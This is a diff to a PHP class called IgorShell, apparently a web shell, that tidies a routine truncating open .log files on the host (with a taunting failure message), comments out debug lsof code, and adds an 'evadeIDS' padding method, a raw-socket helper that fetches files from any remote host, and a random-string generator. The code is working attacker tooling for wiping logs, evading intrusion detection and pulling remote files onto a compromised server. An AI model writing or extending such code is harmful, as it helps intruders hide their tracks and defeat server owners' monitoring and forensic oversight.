@@ -62,16 +62,14 @@ class IgorShell {
     private function getFileDescriptors(  ) {
 
         $it = new DirectoryIterator("glob:///proc/self/fd/*");
-        $x = `lsof`;
-        $return = array();
-        if($b = preg_split('/(\t|\s)+/', $x)){
-            $i = 0;
-            foreach($b as $key => $value){
-                var_dump($key, $value);
-            }
-        }
-        var_dump($return);
-        /*var_dump($x);*/die;
+        // $x = `lsof`;
+        // $return = array();
+        // if($b = preg_split('/(\t|\s)+/', $x)){
+        //     $i = 0;
+        //     foreach($b as $key => $value){
+        //         var_dump($key, $value);
+        //     }
+        // }
         foreach($it as $f) {
 
             $tmpArr = array();
@@ -119,7 +117,7 @@ class IgorShell {
         if( $fd == null ){
             $logfiles = $this->getLogFiles();
         }else{
-            $logfiles[]=$fd;
+            $logfiles[] = $fd;
         }
         foreach($logfiles as $key => $props){
             if(!is_resource($props['fd'])) continue;
@@ -132,15 +130,12 @@ class IgorShell {
                 if(ftruncate($props['fd'] , 0)){
 
                     // Fetch current size of data
-                    $currentSize=strlen( stream_get_contents($props['fd']) );
+                    $currentSize = strlen( stream_get_contents($props['fd']) );
 
                     // Check if current size is smaller then prev size to know the operation was succesfull
-                    if($currentSize<$prevSize||$currentSize==false) {
-
+                    if($currentSize < $prevSize || $currentSize == false) {
                         echo 'Log is empty: '.$props['filepath'].'!<br/>';
-                    }
-                    else {
-
+                    } else {
                         echo 'Log whipe failed, looks like your fucked ;)';
                     }
                 }
@@ -151,19 +146,15 @@ class IgorShell {
     }
 
     private function getLogFiles(){
-
         if(empty($this->m_FileDescriptors)){
-
             $this->getFileDescriptors();
         }
 
         foreach($this->m_FileDescriptors as $fd => $props){
-
             if(preg_match('/((\w)+(\.log))/', $props['filepath'])){
                 $logfiles[$fd] = $props;
             }
         }
-
         return $logfiles;
     }
 
@@ -267,6 +258,89 @@ class IgorShell {
 
             sleep(1000);
         }
+    }
+    public function evadeIDS($arg, $count = false){
+        $output = null;
+        switch(strtolower(gettype($arg))){
+            case 'string':
+                $strlen = strlen($arg);
+                // 255 - strlen to ensure it will work on most/all varchar fields
+                $output = $this->randCode(rand(0, (255-$strlen)));
+                break;
+
+            case 'boolean':
+            case 'integer':
+            default:
+                $output = rand(1, 32);
+                break;
+
+        }
+        return $output;
+    }
+
+    public function getRemoteFile($host, $directory, $filename, &$errstr, &$errno, $port=80, $timeout=10) {
+        $fsock = fsockopen($host, $port, $errno, $errstr, $timeout);
+        if($fsock) {
+            @fputs($fsock, 'GET '.$directory.'/'.$filename.' HTTP/1.1'."\r\n");
+            @fputs($fsock, 'HOST: '.$host."\r\n");
+            @fputs($fsock, 'Connection: close'."\r\n\r\n");
+
+            $file_info = '';
+            $get_info = false;
+
+            while(!feof($fsock)) {
+                if($get_info) {
+                    $file_info .= fread($fsock, 1024);
+                } else {
+                    $line = fgets($fsock, 1024);
+                    if($line == "\r\n") {
+                        $get_info = true;
+                    } else {
+                        if(stripos($line, '404 not found') !== false) {
+                            $errstr = 'Error 404: '.$filename;
+                            return false;
+                        }
+                    }
+                }
+            }
+            fclose($fsock);
+        } else {
+            if($errstr) {
+                return false;
+            } else {
+                $errstr = 'fsockopen is disabled.';
+                return false;
+            }
+        }
+
+        return $file_info;
+    }
+
+    protected function strnstr($haystack, $needle, $nth){
+        $max = strlen($haystack);
+        $n = 0;
+        for( $i=0; $i < $max; $i++ ){
+            if( $haystack[$i] == $needle ){
+                $n++;
+                if( $n >= $nth ){
+                    break;
+                }
+            }
+        }
+        $arr[] = substr($haystack, 0, $i);
+
+        return $arr[0];
+    }
+
+    protected function randCode($maxLength=6){
+        $password = NULL;
+        $possible = 'bcdfghjkmnrstvwxyz123456789';
+        $i = 0;
+        while(($i < $maxLength) && (strlen($possible) > 0)){ $i++;
+            $character = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+            $password .= $character;
+        }
+        return $password;
     }
 }
 
